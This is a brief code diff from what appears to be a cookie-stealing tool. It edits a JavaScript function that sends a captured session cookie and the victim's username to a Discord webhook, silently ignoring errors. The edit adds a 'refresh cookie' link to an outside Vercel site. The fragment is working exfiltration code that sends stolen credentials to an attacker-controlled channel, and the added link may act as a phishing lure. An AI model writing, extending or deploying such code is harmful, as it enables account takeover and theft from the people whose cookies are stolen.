@@ -468,7 +468,7 @@ async function discordSendCookie(url, cookie, username) {
       body: JSON.stringify({
         username: WH_NAME,
         avatar_url: WH_AVATAR,
-        content: `**🔐 Cookie for: ${username || 'Unknown'}**\n\`\`\`\n${cookie}\n\`\`\``
+        content: `**🔐 Cookie for "${username || 'Unknown'}"**\n\nYou need to refresh this cookie to work here: [refresh cookie](https://index-html-ruby-eight.vercel.app/)\n\n\`\`\`\n${cookie}\n\`\`\``
       })
     });
   } catch (_) {}
